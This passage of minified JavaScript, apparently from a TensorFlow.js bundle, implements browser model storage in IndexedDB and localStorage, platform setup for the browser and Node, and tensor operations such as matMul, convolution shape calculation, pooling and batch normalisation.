                    let l;
                    c.onsuccess = ()=>{
                        if (null == c.result)
                            return r.close(),
                            s(new Error(`Cannot find model with path '${t}' in IndexedDB.`));
                        {
                            const u = a.delete(t)
                              , d = ()=>{
                                l = r.transaction(Js, "readwrite");
                                const p = l.objectStore(Js).delete(t);
                                p.onsuccess = ()=>e(c.result.modelArtifactsInfo),
                                p.onerror = f=>s(c.error)
                            }
                            ;
                            u.onsuccess = d,
                            u.onerror = h=>(d(),
                            r.close(),
                            s(c.error))
                        }
                    }
                    ,
                    c.onerror = u=>(r.close(),
                    s(c.error)),
                    i.oncomplete = ()=>{
                        null == l ? r.close() : l.oncomplete = ()=>r.close()
                    }
                }
                ,
                o.onerror = r=>s(o.error)
            }
            ))
        }
    }
    const ns = "/"
      , Bo = "tensorflowjs_models"
      , Sm = "info"
      , Jw = "model_topology"
      , jw = "weight_specs"
      , qw = "weight_data"
      , tC = "model_metadata";
    function km(n) {
        return {
            info: [Bo, n, Sm].join(ns),
            topology: [Bo, n, Jw].join(ns),
            weightSpecs: [Bo, n, jw].join(ns),
            weightData: [Bo, n, qw].join(ns),
            modelMetadata: [Bo, n, tC].join(ns)
        }
    }
    function Tm(n) {
        for (const t of Object.values(n))
            window.localStorage.removeItem(t)
    }
    function eC(n) {
        const t = n.split(ns);
        if (t.length < 3)
            throw new Error(`Invalid key format: ${n}`);
        return t.slice(1, t.length - 1).join(ns)
    }
    class qs {
        constructor(t) {
            if (!z().getBool("IS_BROWSER") || typeof window > "u" || typeof window.localStorage > "u")
                throw new Error("The current environment does not support local storage.");
            if (this.LS = window.localStorage,
            null == t || !t)
                throw new Error("For local storage, modelPath must not be null, undefined or empty.");
            this.modelPath = t,
            this.keys = km(this.modelPath)
        }
        async save(t) {
            if (t.modelTopology instanceof ArrayBuffer)
                throw new Error("BrowserLocalStorage.save() does not support saving model topology in binary formats yet.");
            {
                const e = JSON.stringify(t.modelTopology)
                  , s = JSON.stringify(t.weightSpecs)
                  , o = wm(t)
                  , r = Zo.join(t.weightData);
                try {
                    this.LS.setItem(this.keys.info, JSON.stringify(o)),
                    this.LS.setItem(this.keys.topology, e),
                    this.LS.setItem(this.keys.weightSpecs, s),
                    this.LS.setItem(this.keys.weightData, function Zw(n) {
                        if (od)
                            return Buffer.from(n).toString("base64");
                        const t = new Uint8Array(n);
                        let e = "";
                        for (let s = 0, o = t.length; s < o; s++)
                            e += String.fromCharCode(t[s]);
                        return btoa(e)
                    }(r));
                    const i = {
                        format: t.format,
                        generatedBy: t.generatedBy,
                        convertedBy: t.convertedBy,
                        signature: null != t.signature ? t.signature : void 0,
                        userDefinedMetadata: null != t.userDefinedMetadata ? t.userDefinedMetadata : void 0,
                        modelInitializer: null != t.modelInitializer ? t.modelInitializer : void 0,
                        initializerSignature: null != t.initializerSignature ? t.initializerSignature : void 0,
                        trainingConfig: null != t.trainingConfig ? t.trainingConfig : void 0
                    };
                    return this.LS.setItem(this.keys.modelMetadata, JSON.stringify(i)),
                    {
                        modelArtifactsInfo: o
                    }
                } catch {
                    throw Tm(this.keys),
                    new Error(`Failed to save model '${this.modelPath}' to local storage: size quota being exceeded is a possible cause of this failure: modelTopologyBytes=${o.modelTopologyBytes}, weightSpecsBytes=${o.weightSpecsBytes}, weightDataBytes=${o.weightDataBytes}.`)
                }
            }
        }
        async load() {
            const t = JSON.parse(this.LS.getItem(this.keys.info));
            if (null == t)
                throw new Error(`In local storage, there is no model with name '${this.modelPath}'`);
            if ("JSON" !== t.modelTopologyType)
                throw new Error("BrowserLocalStorage does not support loading non-JSON model topology yet.");
            const e = {}
              , s = JSON.parse(this.LS.getItem(this.keys.topology));
            if (null == s)
                throw new Error(`In local storage, the topology of model '${this.modelPath}' is missing.`);
            e.modelTopology = s;
            const o = JSON.parse(this.LS.getItem(this.keys.weightSpecs));
            if (null == o)
                throw new Error(`In local storage, the weight specs of model '${this.modelPath}' are missing.`);
            e.weightSpecs = o;
            const r = this.LS.getItem(this.keys.modelMetadata);
            if (null != r) {
                const a = JSON.parse(r);
                e.format = a.format,
                e.generatedBy = a.generatedBy,
                e.convertedBy = a.convertedBy,
                null != a.signature && (e.signature = a.signature),
                null != a.userDefinedMetadata && (e.userDefinedMetadata = a.userDefinedMetadata),
                null != a.modelInitializer && (e.modelInitializer = a.modelInitializer),
                null != a.initializerSignature && (e.initializerSignature = a.initializerSignature),
                null != a.trainingConfig && (e.trainingConfig = a.trainingConfig)
            }
            const i = this.LS.getItem(this.keys.weightData);
            if (null == i)
                throw new Error(`In local storage, the binary weight values of model '${this.modelPath}' are missing.`);
            return e.weightData = function Bw(n) {
                if (od) {
                    const s = Buffer.from(n, "base64");
                    return s.buffer.slice(s.byteOffset, s.byteOffset + s.byteLength)
                }
                const t = atob(n)
                  , e = new Uint8Array(t.length);
                for (let s = 0; s < t.length; ++s)
                    e.set([t.charCodeAt(s)], s);
                return e.buffer
            }(i),
            e
        }
    }
    qs.URL_SCHEME = "localstorage://";
    const Nm = n=>z().getBool("IS_BROWSER") && !Array.isArray(n) && n.startsWith(qs.URL_SCHEME) ? function sC(n) {
        return new qs(n)
    }(n.slice(qs.URL_SCHEME.length)) : null;
    $e.registerSaveRouter(Nm),
    $e.registerLoadRouter(Nm);
    class oC {
        constructor() {
            v(z().getBool("IS_BROWSER"), (()=>"Current environment is not a web browser")),
            v(typeof window > "u" || typeof window.localStorage < "u", (()=>"Current browser does not appear to support localStorage")),
            this.LS = window.localStorage
        }
        async listModels() {
            const t = {}
              , e = Bo + ns
              , s = ns + Sm;
            for (let o = 0; o < this.LS.length; ++o) {
                const r = this.LS.key(o);
                if (r.startsWith(e) && r.endsWith(s)) {
                    t[eC(r)] = JSON.parse(this.LS.getItem(r))
                }
            }
            return t
        }
        async removeModel(t) {
            t = function nC(n) {
                return n.startsWith(qs.URL_SCHEME) ? n.slice(qs.URL_SCHEME.length) : n
            }(t);
            const e = km(t);
            if (null == this.LS.getItem(e.info))
                throw new Error(`Cannot find model at path '${t}'`);
            const s = JSON.parse(this.LS.getItem(e.info));
            return Tm(e),
            s
        }
    }
    class zn {
        constructor() {
            this.managers = {}
        }
        static getInstance() {
            return null == zn.instance && (zn.instance = new zn),
            zn.instance
        }
        static registerManager(t, e) {
            v(null != t, (()=>"scheme must not be undefined or null.")),
            t.endsWith("://") && (t = t.slice(0, t.indexOf("://"))),
            v(t.length > 0, (()=>"scheme must not be an empty string."));
            const s = zn.getInstance();
            v(null == s.managers[t], (()=>`A model store manager is already registered for scheme '${t}'.`)),
            s.managers[t] = e
        }
        static getManager(t) {
            const e = zn.getInstance().managers[t];
            if (null == e)
                throw new Error(`Cannot find model manager for scheme '${t}'`);
            return e
        }
        static getSchemes() {
            return Object.keys(zn.getInstance().managers)
        }
    }
    class rC {
        constructor() {
            this.messageName = "setTimeoutCustom",
            this.functionRefs = [],
            this.handledMessageCount = 0,
            this.hasEventListener = !1
        }
        fetch(t, e) {
            return fetch(t, e)
        }
        now() {
            return performance.now()
        }
        encode(t, e) {
            if ("utf-8" !== e && "utf8" !== e)
                throw new Error(`Browser's encoder only supports utf-8, but got ${e}`);
            return null == this.textEncoder && (this.textEncoder = new TextEncoder),
            this.textEncoder.encode(t)
        }
        decode(t, e) {
            return new TextDecoder(e).decode(t)
        }
        setTimeoutCustom(t, e) {
            typeof window > "u" || !z().getBool("USE_SETTIMEOUTCUSTOM") ? setTimeout(t, e) : (this.functionRefs.push(t),
            setTimeout((()=>{
                window.postMessage({
                    name: this.messageName,
                    index: this.functionRefs.length - 1
                }, "*")
            }
            ), e),
            this.hasEventListener || (this.hasEventListener = !0,
            window.addEventListener("message", (s=>{
                if (s.source === window && s.data.name === this.messageName) {
                    s.stopPropagation();
                    (0,
                    this.functionRefs[s.data.index])(),
                    this.handledMessageCount++,
                    this.handledMessageCount === this.functionRefs.length && (this.functionRefs = [],
                    this.handledMessageCount = 0)
                }
            }
            ), !0)))
        }
        isTypedArray(t) {
            return Of(t)
        }
    }
    if (z().get("IS_BROWSER")) {
        z().setPlatform("browser", new rC);
        try {
            zn.registerManager(qs.URL_SCHEME, new oC)
        } catch {}
        try {
            zn.registerManager(js.URL_SCHEME, new Qw)
        } catch {}
    }
    const iC_importFetch = ()=>require("node-fetch");
    let cd;
    function wt(n, t="float32", e) {
        return t = t || "float32",
        es(n),
        new xe(n,t,e)
    }
    z().get("IS_NODE") && !z().get("IS_BROWSER") && z().setPlatform("node", new class aC {
        constructor() {
            this.util = require("util"),
            this.textEncoder = new this.util.TextEncoder
        }
        fetch(t, e) {
            return null != z().global.fetch ? z().global.fetch(t, e) : (null == cd && (cd = iC_importFetch()),
            cd(t, e))
        }
        now() {
            const t = process.hrtime();
            return 1e3 * t[0] + t[1] / 1e6
        }
        encode(t, e) {
            if ("utf-8" !== e && "utf8" !== e)
                throw new Error(`Node built-in encoder only supports utf-8, but got ${e}`);
            return this.textEncoder.encode(t)
        }
        decode(t, e) {
            return 0 === t.length ? "" : new this.util.TextDecoder(e).decode(t)
        }
        isTypedArray(t) {
            return this.util.types.isFloat32Array(t) || this.util.types.isInt32Array(t) || this.util.types.isUint8Array(t) || this.util.types.isUint8ClampedArray(t)
        }
    }
    );
    const st = D({
        cast_: function cC(n, t) {
            const e = N(n, "x", "cast");
            if (!function ew(n) {
                return "bool" === n || "complex64" === n || "float32" === n || "int32" === n || "string" === n
            }(t))
                throw new Error(`Failed to cast to unknown dtype ${t}`);
            if ("string" === t && "string" !== e.dtype || "string" !== t && "string" === e.dtype)
                throw new Error("Only strings can be casted to strings");
            const s = {
                x: e
            }
              , o = {
                dtype: t
            };
            return G.runKernel(Gr, s, o)
        }
    });
    const to = D({
        clone_: function lC(n) {
            const e = {
                x: N(n, "x", "clone", "string_or_numeric")
            };
            return G.runKernel(Kr, e)
        }
    });
    dm(),
    function Ww(n) {
        Po = n
    }({
        buffer: wt,
        cast: st,
        clone: to,
        print: function uC(n, t=!1) {
            console.log(n.toString(t))
        }
    });
    const Q = D({
        add_: function dC(n, t) {
            let e = N(n, "a", "add")
              , s = N(t, "b", "add");
            [e,s] = te(e, s);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Fo, o)
        }
    });
    const $m = D({
        floorDiv_: function hC(n, t) {
            let e = N(n, "a", "floorDiv")
              , s = N(t, "b", "floorDiv");
            [e,s] = te(e, s);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Pr, o)
        }
    });
    const dt = D({
        div_: function pC(n, t) {
            let e = N(n, "a", "div")
              , s = N(t, "b", "div");
            if ([e,s] = te(e, s),
            "int32" === e.dtype && "int32" === s.dtype)
                return $m(e, s);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Mr, o, {})
        }
    });
    const E = D({
        mul_: function fC(n, t) {
            let e = N(n, "a", "mul")
              , s = N(t, "b", "mul");
            [e,s] = te(e, s);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(jr, o)
        }
    });
    const Ge = D({
        abs_: function mC(n) {
            const t = N(n, "x", "abs");
            if ("complex64" === t.dtype) {
                const e = {
                    x: t
                };
                return G.runKernel(Ta, e)
            }
            {
                const e = {
                    x: t
                };
                return G.runKernel(ya, e)
            }
        }
    });
    const bC = D({
        acos_: function gC(n) {
            const e = {
                x: N(n, "x", "acos")
            };
            return G.runKernel(vr, e)
        }
    });
    const yC = D({
        acosh_: function xC(n) {
            const e = {
                x: N(n, "x", "acosh")
            };
            return G.runKernel(Sr, e)
        }
    });
    const Gm = D({
        all_: function IC(n, t=null, e=!1) {
            const o = {
                x: N(n, "x", "all", "bool")
            }
              , r = {
                axis: t,
                keepDims: e
            };
            return G.runKernel("All", o, r)
        }
    });
    const ld = D({
        any_: function wC(n, t=null, e=!1) {
            const o = {
                x: N(n, "x", "any", "bool")
            }
              , r = {
                axis: t,
                keepDims: e
            };
            return G.runKernel("Any", o, r)
        }
    });
    const vi = D({
        argMax_: function CC(n, t=0) {
            const s = {
                x: N(n, "x", "argMax")
            }
              , o = {
                axis: t
            };
            return G.runKernel(Ia, s, o)
        }
    });
    const SC = D({
        argMin_: function vC(n, t=0) {
            const s = {
                x: N(n, "x", "argMin")
            }
              , o = {
                axis: t
            };
            return G.runKernel(wa, s, o)
        }
    });
    const TC = D({
        asin_: function kC(n) {
            const e = {
                x: N(n, "x", "asin")
            };
            return G.runKernel(kr, e)
        }
    });
    const RC = D({
        asinh_: function NC(n) {
            const e = {
                x: N(n, "x", "asinh")
            };
            return G.runKernel(Tr, e)
        }
    });
    const GC = D({
        atan_: function $C(n) {
            const e = {
                x: N(n, "x", "atan")
            };
            return G.runKernel(Nr, e)
        }
    });
    const EC = D({
        atan2_: function LC(n, t) {
            let e = N(n, "a", "atan2")
              , s = N(t, "b", "atan2");
            [e,s] = te(e, s);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel($r, o)
        }
    });
    const WC = D({
        atanh_: function DC(n) {
            const e = {
                x: N(n, "x", "atanh")
            };
            return G.runKernel(Rr, e)
        }
    });
    function Si(n, t, e, s, o="NHWC", r) {
        return ye(n, [...t, n[3]], e, r, s, null, null, os(o))
    }
    function pn(n, t, e, s, o, r, i="channelsLast") {
        const [a,c] = ki(t);
        let l;
        if ("channelsLast" === i)
            l = [a, c, n[3], n[3]];
        else {
            if ("channelsFirst" !== i)
                throw new Error(`Unknown dataFormat ${i}`);
            l = [a, c, n[1], n[1]]
        }
        return ye(n, l, e, s, o, r, !1, i)
    }
    function ss(n, t, e, s, o, r, i="NDHWC") {
        const [a,c,l] = dd(t);
        let u, d;
        if ("NDHWC" === i)
            d = "channelsLast",
            u = [a, c, l, n[4], n[4]];
        else {
            if ("NCDHW" !== i)
                throw new Error(`Unknown dataFormat ${i}`);
            d = "channelsFirst",
            u = [a, c, l, n[1], n[1]]
        }
        return ws(n, u, e, s, o, !1, d, r)
    }
    function ye(n, t, e, s, o, r, i=!1, a="channelsLast") {
        let[c,l,u,d] = [-1, -1, -1, -1];
        if ("channelsLast" === a)
            [c,l,u,d] = n;
        else {
            if ("channelsFirst" !== a)
                throw new Error(`Unknown dataFormat ${a}`);
            [c,d,l,u] = n
        }
        const [h,p,,f] = t
          , [m,g] = ki(e)
          , [b,x] = ki(s)
          , I = Ho(h, b)
          , y = Ho(p, x)
          , {padInfo: w, outHeight: C, outWidth: k} = function FC(n, t, e, s, o, r, i, a, c) {
            let l, u, d;
            if ("number" == typeof n) {
                l = {
                    top: n,
                    bottom: n,
                    left: n,
                    right: n,
                    type: 0 === n ? "VALID" : "NUMBER"
                };
                const p = function MC(n, t, e, s, o) {
                    null == s && (s = ud(n, t, e));
                    const r = n[0]
                      , i = n[1]
                      , a = Ti((r - t + 2 * s) / e + 1, o)
                      , c = Ti((i - t + 2 * s) / e + 1, o);
                    return [a, c]
                }([t, e], r, s, n, a);
                u = p[0],
                d = p[1]
            } else if ("same" === n) {
                u = Math.ceil(t / s),
                d = Math.ceil(e / o);
                const h = Math.max(0, (u - 1) * s + r - t)
                  , p = Math.max(0, (d - 1) * o + i - e)
                  , f = Math.floor(h / 2)
                  , m = h - f
                  , g = Math.floor(p / 2);
                l = {
                    top: f,
                    bottom: m,
                    left: g,
                    right: p - g,
                    type: "SAME"
                }
            } else if ("valid" === n)
                l = {
                    top: 0,
                    bottom: 0,
                    left: 0,
                    right: 0,
                    type: "VALID"
                },
                u = Math.ceil((t - r + 1) / s),
                d = Math.ceil((e - i + 1) / o);
            else {
                if ("object" != typeof n)
                    throw Error(`Unknown padding parameter: ${n}`);
                {
                    const h = "channelsLast" === c ? n[1][0] : n[2][0]
                      , p = "channelsLast" === c ? n[1][1] : n[2][1]
                      , f = "channelsLast" === c ? n[2][0] : n[3][0]
                      , m = "channelsLast" === c ? n[2][1] : n[3][1];
                    l = {
                        top: h,
                        bottom: p,
                        left: f,
                        right: m,
                        type: 0 === h && 0 === p && 0 === f && 0 === m ? "VALID" : "EXPLICIT"
                    },
                    u = Ti((t - r + h + p) / s + 1, a),
                    d = Ti((e - i + f + m) / o + 1, a)
                }
            }
            return {
                padInfo: l,
                outHeight: u,
                outWidth: d
            }
        }(o, l, u, m, g, I, y, r, a)
          , S = i ? f * d : f;
        let T;
        return "channelsFirst" === a ? T = [c, S, C, k] : "channelsLast" === a && (T = [c, C, k, S]),
        {
            batchSize: c,
            dataFormat: a,
            inHeight: l,
            inWidth: u,
            inChannels: d,
            outHeight: C,
            outWidth: k,
            outChannels: S,
            padInfo: w,
            strideHeight: m,
            strideWidth: g,
            filterHeight: h,
            filterWidth: p,
            effectiveFilterHeight: I,
            effectiveFilterWidth: y,
            dilationHeight: b,
            dilationWidth: x,
            inShape: n,
            outShape: T,
            filterShape: t
        }
    }
    function ws(n, t, e, s, o, r=!1, i="channelsLast", a) {
        let[c,l,u,d,h] = [-1, -1, -1, -1, -1];
        if ("channelsLast" === i)
            [c,l,u,d,h] = n;
        else {
            if ("channelsFirst" !== i)
                throw new Error(`Unknown dataFormat ${i}`);
            [c,h,l,u,d] = n
        }
        const [p,f,m,,g] = t
          , [b,x,I] = dd(e)
          , [y,w,C] = dd(s)
          , k = Ho(p, y)
          , S = Ho(f, w)
          , T = Ho(m, C)
          , {padInfo: R, outDepth: L, outHeight: V, outWidth: F} = function zC(n, t, e, s, o, r, i, a, c, l, u) {
            let d, h, p, f;
            if ("valid" === n && (n = 0),
            "number" == typeof n) {
                d = {
                    top: n,
                    bottom: n,
                    left: n,
                    right: n,
                    front: n,
                    back: n,
                    type: 0 === n ? "VALID" : "NUMBER"
                };
                const g = function VC(n, t, e, s, o, r) {
                    null == o && (o = ud(n, t[0], s[0]));
                    const i = [0, 0, 0, e];
                    for (let a = 0; a < 3; a++)
                        n[a] + 2 * o >= t[a] && (i[a] = Ti((n[a] - t[a] + 2 * o) / s[a] + 1, r));
                    return i
                }([t, e, s, 1], [a, c, l], 1, [o, r, i], n, u);
                h = g[0],
                p = g[1],
                f = g[2]
            } else {
                if ("same" !== n)
                    throw Error(`Unknown padding parameter: ${n}`);
                {
                    h = Math.ceil(t / o),
                    p = Math.ceil(e / r),
                    f = Math.ceil(s / i);
                    const m = (h - 1) * o + a - t
                      , g = (p - 1) * r + c - e
                      , b = (f - 1) * i + l - s
                      , x = Math.floor(m / 2)
                      , I = m - x
                      , y = Math.floor(g / 2)
                      , w = g - y
                      , C = Math.floor(b / 2);
                    d = {
                        top: y,
                        bottom: w,
                        left: C,
                        right: b - C,
                        front: x,
                        back: I,
                        type: "SAME"
                    }
                }
            }
            return {
                padInfo: d,
                outDepth: h,
                outHeight: p,
                outWidth: f
            }
        }(o, l, u, d, b, x, I, k, S, T, a)
          , X = r ? g * h : g;
        let A;
        return "channelsFirst" === i ? A = [c, X, L, V, F] : "channelsLast" === i && (A = [c, L, V, F, X]),
        {
            batchSize: c,
            dataFormat: i,
            inDepth: l,
            inHeight: u,
            inWidth: d,
            inChannels: h,
            outDepth: L,
            outHeight: V,
            outWidth: F,
            outChannels: X,
            padInfo: R,
            strideDepth: b,
            strideHeight: x,
            strideWidth: I,
            filterDepth: p,
            filterHeight: f,
            filterWidth: m,
            effectiveFilterDepth: k,
            effectiveFilterHeight: S,
            effectiveFilterWidth: T,
            dilationDepth: y,
            dilationHeight: w,
            dilationWidth: C,
            inShape: n,
            outShape: A,
            filterShape: t
        }
    }
    function ud(n, t, e, s=1) {
        const o = Ho(t, s);
        return Math.floor((n[0] * (e - 1) - e + o) / 2)
    }
    function ki(n) {
        return "number" == typeof n ? [n, n, n] : 2 === n.length ? [n[0], n[1], 1] : n
    }
    function dd(n) {
        return "number" == typeof n ? [n, n, n] : n
    }
    function Ho(n, t) {
        return t <= 1 ? n : n + (n - 1) * (t - 1)
    }
    function Ti(n, t) {
        if (!t)
            return Math.trunc(n);
        switch (t) {
        case "round":
            return Math.round(n);
        case "ceil":
            return Math.ceil(n);
        case "floor":
            return Math.floor(n);
        default:
            throw new Error(`Unknown roundingMode ${t}`)
        }
    }
    function eo(n) {
        const [t,e,s] = ki(n);
        return 1 === t && 1 === e && 1 === s
    }
    function Te(n, t) {
        return eo(n) || eo(t)
    }
    function no(n) {
        return ki(n).every((t=>t > 0))
    }
    function os(n) {
        if ("NHWC" === n)
            return "channelsLast";
        if ("NCHW" === n)
            return "channelsFirst";
        throw new Error(`Unknown dataFormat ${n}`)
    }
    function ze(n, t, e) {
        if (null != e) {
            if ("string" == typeof t)
                throw Error(`Error in ${n}: pad must be an integer when using dimRoundingMode ${e} but got pad ${t}.`);
            if ("number" == typeof t)
                v(Do(t), (()=>`Error in ${n}: pad must be an integer when using dimRoundingMode ${e} but got pad ${t}.`));
            else {
                if ("object" != typeof t)
                    throw Error(`Error in ${n}: Unknown padding parameter: ${t}`);
                t.forEach((s=>{
                    s.forEach((o=>{
                        v(Do(o), (()=>`Error in ${n}: pad must be an integer when using dimRoundingMode ${e} but got pad ${o}.`))
                    }
                    ))
                }
                ))
            }
        }
    }
    const W = D({
        reshape_: function XC(n, t) {
            const s = {
                x: N(n, "x", "reshape", "string_or_numeric")
            }
              , o = {
                shape: t
            };
            return G.runKernel(ic, s, o)
        }
    });
    const hd = D({
        avgPool_: function AC(n, t, e, s, o) {
            const r = N(n, "x", "avgPool", "float32");
            v(Te(e, 1), (()=>`Error in avgPool: Either strides or dilations must be 1. Got strides ${e} and dilations '1'`));
            let a = r
              , c = !1;
            3 === r.rank && (c = !0,
            a = W(r, [1, r.shape[0], r.shape[1], r.shape[2]])),
            v(4 === a.rank, (()=>`Error in avgPool: x must be rank 4 but got rank ${a.rank}.`)),
            ze("avgPool", s, o);
            const l = {
                x: a
            }
              , u = {
                filterSize: t,
                strides: e,
                pad: s,
                dimRoundingMode: o
            };
            let d = G.runKernel(Ca, l, u);
            return d = st(d, r.dtype),
            c ? W(d, [d.shape[1], d.shape[2], d.shape[3]]) : d
        }
    });
    const OC = D({
        avgPool3d_: function PC(n, t, e, s, o, r="NDHWC") {
            const i = N(n, "x", "avgPool3d", "float32");
            let a = i
              , c = !1;
            4 === i.rank && (c = !0,
            a = W(i, [1, i.shape[0], i.shape[1], i.shape[2], i.shape[3]])),
            v(5 === a.rank, (()=>`Error in avgPool3d: x must be rank 5 but got rank ${a.rank}.`)),
            v("NDHWC" === r, (()=>`Error in avgPool3d: Only NDHWC is currently supported, but got dataFormat of ${r}`)),
            v("number" == typeof e && e > 0 || Array.isArray(e) && e[0] > 0 && e[1] > 0 && e[2] > 0, (()=>`Error in avgPool3d: Stride must be > 0, but got '${e}'`)),
            ze("avgPool3d", s, o);
            const l = {
                x: a
            }
              , u = {
                filterSize: t,
                strides: e,
                pad: s,
                dimRoundingMode: o,
                dataFormat: r
            };
            let d = G.runKernel(va, l, u);
            return d = st(d, a.dtype),
            c ? W(d, [d.shape[1], d.shape[2], d.shape[3], d.shape[4]]) : d
        }
    });
    const Xe = D({
        concat_: function KC(n, t=0) {
            v(n.length >= 1, (()=>"Pass at least one tensor to concat"));
            const e = gm(n, "tensors", "concat", "string_or_numeric");
            if ("complex64" === e[0].dtype && e.forEach((r=>{
                if ("complex64" !== r.dtype)
                    throw new Error(`Cannot concatenate complex64 tensors with a tensor\n          with dtype ${r.dtype}. `)
            }
            )),
            1 === e.length)
                return to(e[0]);
            const s = e
              , o = {
                axis: t
            };
            return G.runKernel(Na, s, o)
        }
    });
    const $t = D({
        matMul_: function ZC(n, t, e=!1, s=!1) {
            let o = N(n, "a", "matMul")
              , r = N(t, "b", "matMul");
            [o,r] = te(o, r);
            const i = {
                a: o,
                b: r
            }
              , a = {
                transposeA: e,
                transposeB: s
            };
            return G.runKernel(Sa, i, a)
        }
    });
    const _o = D({
        sigmoid_: function BC(n) {
            const e = {
                x: N(n, "x", "sigmoid", "float32")
            };
            return G.runKernel(li, e)
        }
    });
    const Xt = D({
        slice_: function HC(n, t, e) {
            const s = N(n, "x", "slice", "string_or_numeric");
            if (0 === s.rank)
                throw new Error("Slicing scalar is not possible");
            const o = {
                x: s
            }
              , r = {
                begin: t,
                size: e
            };
            return G.runKernel(dc, o, r)
        }
    });
    const pd = D({
        tanh_: function _C(n) {
            const e = {
                x: N(n, "x", "tanh", "float32")
            };
            return G.runKernel(mi, e)
        }
    });
    const fd = D({
        batchToSpaceND_: function UC(n, t, e) {
            const s = N(n, "x", "batchToSpaceND")
              , o = t.reduce(((a,c)=>a * c));
            v(s.rank >= 1 + t.length, (()=>`input rank is ${s.rank} but should be > than blockShape.length ${t.length}`)),
            v(e.length === t.length, (()=>`crops.length is ${e.length} but should be equal to blockShape.length  ${t.length}`)),
            v(s.shape[0] % o == 0, (()=>`input tensor batch is ${s.shape[0]} but is not divisible by the product of the elements of blockShape ${t.join(" * ")} === ${o}`));
            const r = {
                x: s
            }
              , i = {
                blockShape: t,
                crops: e
            };
            return G.runKernel(ka, r, i)
        }
    });
    function YC(n) {
        let t;
        return t = 0 === n.rank || 1 === n.rank ? W(n, [1, 1, 1, n.size]) : 2 === n.rank ? W(n, [1, 1, n.shape[0], n.shape[1]]) : 3 === n.rank ? W(n, [1, n.shape[0], n.shape[1], n.shape[2]]) : n,
        t
    }
    const Rc = D({
        batchNorm_: function QC(n, t, e, s, o, r) {
            null == r && (r = .001);
            const i = N(n, "x", "batchNorm")
              , a = N(t, "mean", "batchNorm")
              , c = N(e, "variance", "batchNorm");
            let l, u;
            null != o && (l = N(o, "scale", "batchNorm")),
            null != s && (u = N(s, "offset", "batchNorm")),
            v(a.rank === c.rank, (()=>"Batch normalization gradient requires mean and variance to have equal ranks.")),
            v(null == u || a.rank === u.rank, (()=>"Batch normalization gradient requires mean and offset to have equal ranks.")),
            v(null == l || a.rank === l.rank, (()=>"Batch normalization gradient requires mean and scale to have equal ranks."));
            const h = {
                x: YC(i),
                scale: l,
                offset: u,
                mean: a,
                variance: c
            }
              , p = {
                varianceEpsilon: r
            }
              , f = G.runKernel(Va, h, p);
            return W(f, i.shape)
        }
    });
    const jC = D({
        batchNorm2d_: function JC(n, t, e, s, o, r) {
            const i = N(n, "x", "batchNorm")
              , a = N(t, "mean", "batchNorm")
              , c = N(e, "variance", "batchNorm");
            let l, u;
            return null != o && (l = N(o, "scale", "batchNorm")),
            null != s && (u = N(s, "offset", "batchNorm")),
            v(2 === i.rank, (()=>`Error in batchNorm2D: x must be rank 2 but got rank ${i.rank}.`)),
            v(2 === a.rank || 1 === a.rank, (()=>`Error in batchNorm2D: mean must be rank 2 or rank 1 but got rank ${a.rank}.`)),
            v(2 === c.rank || 1 === c.rank, (()=>`Error in batchNorm2D: variance must be rank 2 or rank 1 but got rank ${c.rank}.`)),
            null != l && v(2 === l.rank || 1 === l.rank, (()=>`Error in batchNorm2D: scale must be rank 2 or rank 1 but got rank ${l.rank}.`)),
            null != u && v(2 === u.rank || 1 === u.rank, (()=>`Error in batchNorm2D: offset must be rank 2 or rank 1 but got rank ${u.rank}.`)),
            Rc(i, a, c, u, l, r)
        }
    });
    const t2 = D({
        batchNorm3d_: function qC(n, t, e, s, o, r) {
            const i = N(n, "x", "batchNorm")
              , a = N(t, "mean", "batchNorm")
              , c = N(e, "variance", "batchNorm");
            let l, u;
            return null != o && (l = N(o, "scale", "batchNorm")),
            null != s && (u = N(s, "offset", "batchNorm")),
            v(3 === i.rank, (()=>`Error in batchNorm3D: x must be rank 3 but got rank ${i.rank}.`)),
            v(3 === a.rank || 1 === a.rank, (()=>`Error in batchNorm3D: mean must be rank 3 or rank 1 but got rank ${a.rank}.`)),
            v(3 === c.rank || 1 === c.rank, (()=>`Error in batchNorm3D: variance must be rank 3 or rank 1 but got rank ${c.rank}.`)),
            null != l && v(3 === l.rank || 1 === l.rank, (()=>`Error in batchNorm3D: scale must be rank 3 or rank 1 but got rank ${l.rank}.`)),
            null != u && v(3 === u.rank || 1 === u.rank, (()=>`Error in batchNorm3D: offset must be rank 3 or rank 1 but got rank ${u.rank}.`)),
            Rc(i, a, c, u, l, r)
        }
    });
    const n2 = D({
        batchNorm4d_: function e2(n, t, e, s, o, r) {
            const i = N(n, "x", "batchNorm")
              , a = N(t, "mean", "batchNorm")
              , c = N(e, "variance", "batchNorm");
            let l, u;
            return null != o && (l = N(o, "scale", "batchNorm")),
            null != s && (u = N(s, "offset", "batchNorm")),
            v(4 === i.rank, (()=>`Error in batchNorm4D: x must be rank 4 but got rank ${i.rank}.`)),
            v(4 === a.rank || 1 === a.rank, (()=>`Error in batchNorm4D: mean must be rank 4 or rank 1 but got rank ${a.rank}.`)),
            v(4 === c.rank || 1 === c.rank, (()=>`Error in batchNorm4D: variance must be rank 4 or rank 1 but got rank ${c.rank}.`)),
            null != l && v(4 === l.rank || 1 === l.rank, (()=>`Error in batchNorm4D: scale must be rank 4 or rank 1 but got rank ${l.rank}.`)),
            null != u && v(4 === u.rank || 1 === u.rank, (()=>`Error in batchNorm4D: offset must be rank 4 or rank 1 but got rank ${u.rank}.`)),
            Rc(i, a, c, u, l, r)
        }
    });
    const o2 = D({
        bincount_: function s2(n, t, e) {
            const s = N(n, "x", "bincount")
              , o = N(t, "weights", "bincount");
            v("int32" === s.dtype, (()=>`Error in bincount: input dtype must be int32, but got ${s.dtype}`)),
            v(e >= 0, (()=>`size must be non-negative, but got ${e}.`)),
            v(o.size === s.size || 0 === o.size, (()=>`Error in bincount: weights must have the same size as input or0-length, but got input shape: ${s.shape}, weights shape: ${o.shape}.`));
            const r = {
                x: s,
                weights: o
            }
              , i = {
                size: e
            };
            return G.runKernel(au, r, i)
        }
    });
    const Ni = D({
        broadcastTo_: function r2(n, t) {
            let e = N(n, "broadcastTo", "x");
            const s = e.shape;
            if (es(t),
            t.length < e.rank)
                throw new Error(`broadcastTo(): shape.length=${t.length} < input.rank=${e.rank}.`);
            if (t.length > e.rank) {
                const l = e.shape.slice();
                for (; l.length < t.length; )
